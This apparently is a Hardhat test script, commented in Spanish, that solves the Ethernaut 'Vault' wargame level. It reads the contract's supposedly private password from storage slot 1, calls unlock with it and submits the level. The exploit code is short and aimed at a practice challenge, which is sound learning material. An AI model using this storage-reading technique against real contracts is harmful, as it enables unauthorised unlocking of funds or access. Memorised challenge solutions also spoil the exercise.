import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract;
const LEVEL_ADDRESS = "0xf94b476063B6379A3c8b6C836efB8B3e10eDe188";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  //Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`Vault`);
  const challengeAddress = await createChallenge(
    LEVEL_ADDRESS
  );
  challenge = challengeFactory.attach(challengeAddress);

  // //Contrato atacante (Si fuera necesario)
  // const attackerFactory = await ethers.getContractFactory(`Voltorb`);
  // attacker = await attackerFactory.deploy({ value: 2 });
});

describe("Vault Challenge", async ()=> {
  it("Resuelve el challenge - Vault", async ()=> {
    let password = await ethers.provider.getStorageAt(challenge.address,1);
    let txUnlock = await challenge.unlock(password);
    await txUnlock.wait();

    // De curioso nomás para saber cuál era el password (no hace falta).
    console.log(`password --> ${password}`);
    console.log(`DESENCODEANDO EL PASSWORD HEXADECIMAL--> ${Buffer.from(password.slice(2), `hex`)}`);
    
    
    expect(await challenge.locked(), "LA BÓVEDA CONTINÚA CERRADA").to.be.false;
  })
})

after(async () => {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});

// Para encontrar las funciones que necesitamos en ethers js, conviene seleccionar la página como "Single Page". De esta forma al hacer una búsqueda con Ctrl+f se puede dar con el resultado más fácilmente. 
// https://docs.ethers.io/v5/single-page/#/v5/api/providers/provider/-%23-Provider-getStorageAt